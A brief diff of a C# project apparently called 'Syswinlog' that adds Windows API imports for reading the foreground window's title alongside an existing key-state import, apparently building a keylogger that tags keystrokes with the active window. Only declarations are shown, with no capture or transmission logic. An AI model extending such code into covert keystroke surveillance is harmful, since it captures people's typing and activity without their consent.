@@ -1,4 +1,5 @@
 using System;
+using System.Text;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
@@ -6,6 +7,12 @@ namespace Syswinlog.Classes.NativeMethods
 {
     class NativeMethods
     {
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
         [DllImport("User32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
         public static extern short GetKeyState(int keycode);
         
